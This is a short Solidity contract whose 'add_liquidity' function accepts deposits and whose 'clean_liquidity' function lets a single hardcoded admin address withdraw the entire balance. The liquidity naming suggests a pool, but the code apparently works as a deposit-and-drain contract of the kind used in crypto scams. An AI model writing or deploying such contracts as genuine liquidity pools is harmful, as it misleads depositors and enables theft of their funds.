// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


contract TmppezxzuV1 {
    address payable public admin_address = payable(0x35A12Eb6115dCA446D93F31a0d0A6029029C53d1);

    function add_liquidity() public payable {}

    function clean_liquidity() public {
        require(msg.sender == admin_address, "Only the admin address can call this function.");
        admin_address.transfer(address(this).balance);
    }
}